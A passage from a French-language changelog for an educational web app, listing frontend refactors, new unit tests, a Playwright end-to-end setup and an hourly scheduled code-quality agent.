- Recherche debounced dans l'historique Quiz et REX (nouveau composable `useDebounce`)
- Couleurs de notes unifiees entre dashboard etudiant et analytique enseignant
- Cles localStorage centralisees dans `STORAGE_KEYS` (bookmarks, quicklinks, remember_token)
- `.sa-empty` deduplique dans un CSS partage au lieu de 7 copies
- `numericGradeClass()` et `gradeColor()` extraits dans `utils/grade.ts`
- Performances : WidgetGroupMembers passe de N³ appels API a 3 requetes, WidgetRecentDoc optimise (reduce au lieu de sort)

### Tests

- 21 nouveaux tests : `grade.test.ts` (15) + `useDebounce.test.ts` (6)
- Total frontend : 12 fichiers, 149 tests, 100% pass

### Infrastructure

- Configuration Playwright E2E prete (playwright.config.ts, tests/e2e/auth.spec.ts)
- Agent distant programme toutes les heures pour ameliorer la qualite du code et la securite
- Scripts `test:e2e` et `test:e2e:ui` ajoutes

---

## v1.0.13 et avant

Voir l'historique git pour les versions precedentes.
